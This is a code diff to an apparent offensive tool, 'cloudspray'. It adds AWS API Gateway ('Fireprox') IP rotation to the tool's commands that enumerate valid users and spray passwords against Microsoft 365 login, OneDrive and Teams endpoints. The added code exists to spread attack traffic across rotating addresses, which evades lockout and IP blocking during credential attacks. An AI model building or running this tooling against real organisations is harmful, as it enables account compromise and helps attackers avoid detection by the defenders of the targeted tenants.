@@ -1,6 +1,8 @@
 import click
 
-from cloudspray.config import load_config
+from cloudspray.config import CloudSprayConfig, load_config
+from cloudspray.proxy import AWSGatewayProvider, ProxyManager
+from cloudspray.proxy.session import FireproxSession
 from cloudspray.reporting.console import ConsoleReporter
 from cloudspray.state.db import StateDB
 from cloudspray.utils import setup_logging
@@ -60,6 +62,49 @@ def cli(ctx, config, db, verbose):
     ctx.obj["reporter"] = ConsoleReporter(verbose=verbose)
 
 
+_ENUM_TARGET_HOSTS = {
+    "msol": "login.microsoftonline.com",
+    "login": "login.microsoftonline.com",
+    "onedrive": None,  # derived from domain: {tenant}-my.sharepoint.com
+    "teams": "teams.microsoft.com",
+}
+_SPRAY_TARGET_HOST = "login.microsoftonline.com"
+
+
+def _build_fireprox_session(
+    config: CloudSprayConfig,
+    target_host: str | None,
+    reporter: ConsoleReporter,
+) -> tuple[ProxyManager | None, FireproxSession | None]:
+    """Create a FireproxSession backed by AWS API Gateway, if enabled.
+
+    Returns (proxy_manager, proxy_session). Both are None when the proxy
+    is disabled or target_host is None.
+    """
+    if not config.proxy.aws_gateway.enabled or target_host is None:
+        return None, None
+
+    gw_cfg = config.proxy.aws_gateway
+    provider = AWSGatewayProvider(
+        access_key=gw_cfg.access_key,
+        secret_key=gw_cfg.secret_key,
+        regions=gw_cfg.regions,
+    )
+
+    manager = ProxyManager()
+    manager.add_provider(provider)
+    manager.setup_all(f"https://{target_host}")
+
+    if not provider.health_check():
+        reporter.error("Fireprox health check failed, tearing down gateways")
+        manager.teardown_all()
+        raise SystemExit(1)
+
+    reporter.info(f"Fireprox ready: {len(provider._gateway_urls)} gateway(s) active")
+    session = FireproxSession(provider, target_host)
+    return manager, session
+
+
 @cli.command("enum")
 @click.option("-d", "--domain", required=True, help="Target domain.")
 @click.option(
@@ -107,13 +152,20 @@ def enum_cmd(ctx, domain, users, method, output, teams_user, teams_pass):
 
     userlist = read_userlist(users)
 
+    # Determine target host for proxy routing
+    target_host = _ENUM_TARGET_HOSTS[method]
+    if method == "onedrive":
+        target_host = f"{domain.split('.')[0]}-my.sharepoint.com"
+
+    proxy_manager, proxy_session = _build_fireprox_session(cfg, target_host, reporter)
+
     try:
         with StateDB(ctx.obj["db_path"]) as db:
             reporter.info(f"Enumeration starting: domain={domain}, method={method}")
             reporter.info(f"User list: {users} ({len(userlist)} entries)")
 
             if method == "onedrive":
-                enumerator = OneDriveEnumerator(domain, db, reporter)
+                enumerator = OneDriveEnumerator(domain, db, reporter, proxy_session=proxy_session)
                 valid = enumerator.enumerate(userlist)
             elif method == "teams":
                 enumerator = TeamsEnumerator(
@@ -123,10 +175,10 @@ def enum_cmd(ctx, domain, users, method, output, teams_user, teams_pass):
                 )
                 valid = enumerator.enumerate(userlist)
             elif method == "msol":
-                enumerator = MSOLEnumerator(domain, db, reporter)
+                enumerator = MSOLEnumerator(domain, db, reporter, proxy_session=proxy_session)
                 valid = enumerator.enumerate(userlist)
             elif method == "login":
-                enumerator = LoginEnumerator(domain, db, reporter)
+                enumerator = LoginEnumerator(domain, db, reporter, proxy_session=proxy_session)
                 valid = enumerator.enumerate(userlist)
             else:
                 reporter.error(f"Unknown enumeration method: {method}")
@@ -143,6 +195,10 @@ def enum_cmd(ctx, domain, users, method, output, teams_user, teams_pass):
     except Exception as exc:
         reporter.error(f"Enumeration failed: {exc}")
         raise SystemExit(1) from exc
+    finally:
+        if proxy_manager is not None:
+            reporter.info("Tearing down Fireprox gateways")
+            proxy_manager.teardown_all()
 
 
 @cli.command("spray")
@@ -213,6 +269,8 @@ def spray_cmd(ctx, domain, users, passwords, password, delay, jitter,
     else:
         passlist = [password]
 
+    proxy_manager, proxy_session = _build_fireprox_session(cfg, _SPRAY_TARGET_HOST, reporter)
+
     try:
         with StateDB(ctx.obj["db_path"]) as db:
             reporter.info(f"Spray engine starting: domain={domain}")
@@ -221,7 +279,7 @@ def spray_cmd(ctx, domain, users, passwords, password, delay, jitter,
                 f"Delay={cfg.spray.delay}s, Jitter={cfg.spray.jitter}s, "
                 f"Shuffle={cfg.spray.shuffle_mode}"
             )
-            authenticator = Authenticator(cfg.target.domain)
+            authenticator = Authenticator(cfg.target.domain, proxy_session=proxy_session)
             engine = SprayEngine(cfg, db, authenticator, reporter)
             engine.run(userlist, passlist, resume=resume)
     except (KeyboardInterrupt, SystemExit):
@@ -229,6 +287,10 @@ def spray_cmd(ctx, domain, users, passwords, password, delay, jitter,
     except Exception as exc:
         reporter.error(f"Spray failed: {exc}")
         raise SystemExit(1) from exc
+    finally:
+        if proxy_manager is not None:
+            reporter.info("Tearing down Fireprox gateways")
+            proxy_manager.teardown_all()
 
 
 @cli.command("post")
